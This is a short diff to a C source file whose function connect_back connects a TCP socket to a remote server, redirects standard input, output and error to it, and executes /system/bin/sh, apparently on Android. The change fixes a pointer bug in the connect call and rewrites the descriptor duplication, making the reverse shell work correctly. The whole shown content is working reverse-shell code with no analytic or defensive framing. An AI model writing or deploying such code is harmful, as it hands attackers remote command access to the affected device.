@@ -1,4 +1,5 @@
 #include <stdlib.h>
+#include <unistd.h>
 #include <sys/types.h> 
 #include <sys/socket.h>
 #include <netdb.h>
@@ -7,11 +8,11 @@
 void connect_back(struct sockaddr_in *server) 
 {
   int sock;
-  int desc = 3;
   sock = socket(PF_INET, SOCK_STREAM, 0);
-  connect(sock, (struct sockaddr *) &server, sizeof server) ;
-  while (desc)
-    dup2(sock, --desc);
+  connect(sock, (struct sockaddr *) server, sizeof server) ;
+  dup2(sock, STDERR_FILENO);
+  dup2(sock, STDOUT_FILENO);
+  dup2(sock, STDIN_FILENO);
   char *args[] = { "/system/bin/sh", NULL};
   execve(args[0], args, NULL);
 }
